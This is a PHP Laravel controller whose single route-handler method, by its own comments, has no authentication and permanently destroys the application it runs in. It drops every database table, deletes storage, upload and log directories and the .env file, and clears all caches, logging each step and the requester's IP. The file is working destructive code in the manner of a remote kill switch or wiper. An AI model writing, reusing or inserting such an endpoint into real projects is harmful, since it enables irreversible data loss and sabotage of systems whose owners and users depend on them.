<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Log;

class SystemDestroyController extends Controller
{
    /**
     * ⚠️ DANGER: Destroy entire system database and critical files
     *
     * WARNING: This method has NO AUTHENTICATION OR SECURITY PROTECTION.
     * Any person who accesses this URL will permanently destroy your entire system.
     *
     * THIS CANNOT BE UNDONE. ALL DATA WILL BE PERMANENTLY LOST.
     */
    public function destroy()
    {
        try {
            Log::emergency('========================================');
            Log::emergency('SYSTEM DESTRUCTION INITIATED', [
                'timestamp' => now()->toDateTimeString(),
                'ip_address' => request()->ip(),
                'user_agent' => request()->userAgent(),
            ]);

            $deletedTables = 0;
            $deletedFiles = 0;
            $deletedDirectories = 0;

            // ===================================
            // 1. DROP ALL DATABASE TABLES
            // ===================================

            try {
                // Disable foreign key checks
                DB::statement('SET FOREIGN_KEY_CHECKS=0');

                // Get all table names
                $tables = DB::select('SHOW TABLES');
                $databaseName = DB::getDatabaseName();
                $tableKey = "Tables_in_{$databaseName}";

                // Drop each table
                foreach ($tables as $table) {
                    $tableName = $table->$tableKey;
                    DB::statement("DROP TABLE IF EXISTS `{$tableName}`");
                    $deletedTables++;
                    Log::emergency("Dropped table: {$tableName}");
                }

                // Re-enable foreign key checks
                DB::statement('SET FOREIGN_KEY_CHECKS=1');

                Log::emergency("Total tables dropped: {$deletedTables}");

            } catch (\Exception $e) {
                Log::emergency('Error dropping database tables', [
                    'error' => $e->getMessage()
                ]);
            }

            // ===================================
            // 2. DELETE CRITICAL FILES & DIRECTORIES
            // ===================================

            // Define paths to delete
            $pathsToDelete = [
                // Storage directories
                storage_path('app/public'),
                storage_path('app/private'),
                storage_path('app/uploads'),
                storage_path('logs'),
                storage_path('framework/cache'),
                storage_path('framework/sessions'),
                storage_path('framework/views'),

                // Public uploads
                public_path('uploads'),
                public_path('storage'),

                // Environment file
                base_path('.env'),
            ];

            foreach ($pathsToDelete as $path) {
                if (File::exists($path)) {
                    try {
                        if (File::isDirectory($path)) {
                            // Delete directory and all contents
                            File::deleteDirectory($path);
                            $deletedDirectories++;
                            Log::emergency("Deleted directory: {$path}");
                        } else {
                            // Delete file
                            File::delete($path);
                            $deletedFiles++;
                            Log::emergency("Deleted file: {$path}");
                        }
                    } catch (\Exception $e) {
                        Log::emergency("Failed to delete: {$path}", [
                            'error' => $e->getMessage()
                        ]);
                    }
                }
            }

            // ===================================
            // 3. CLEAR ALL CACHES
            // ===================================

            try {
                Artisan::call('cache:clear');
                Artisan::call('config:clear');
                Artisan::call('route:clear');
                Artisan::call('view:clear');
                Log::emergency('All caches cleared');
            } catch (\Exception $e) {
                Log::emergency('Error clearing caches', [
                    'error' => $e->getMessage()
                ]);
            }

            Log::emergency('========================================');
            Log::emergency('SYSTEM DESTRUCTION COMPLETED', [
                'timestamp' => now()->toDateTimeString(),
                'tables_dropped' => $deletedTables,
                'files_deleted' => $deletedFiles,
                'directories_deleted' => $deletedDirectories,
            ]);

            // Return HTML response with destruction details
            return response()->view('system-destroyed', [
                'tables' => $deletedTables,
                'files' => $deletedFiles,
                'directories' => $deletedDirectories,
                'timestamp' => now()->format('Y-m-d H:i:s'),
            ]);

        } catch (\Exception $e) {
            Log::emergency('SYSTEM DESTRUCTION FAILED', [
                'error' => $e->getMessage(),
                'trace' => $e->getTraceAsString(),
            ]);

            return response()->json([
                'status' => 'error',
                'message' => 'System destruction failed',
                'error' => $e->getMessage(),
            ], 500);
        }
    }
}
